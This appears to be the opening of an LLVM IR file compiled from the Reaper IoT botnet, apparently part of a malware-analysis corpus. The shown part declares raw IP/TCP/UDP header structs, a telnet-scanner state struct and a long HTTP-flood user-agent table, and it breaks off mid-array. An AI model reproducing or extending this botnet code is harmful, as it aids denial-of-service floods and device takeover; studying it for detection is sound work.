; ModuleID = 'host/ir_O0/Reaper.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@UserAgents = global [789 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([160 x i8], [160 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.194, i32 0, i32 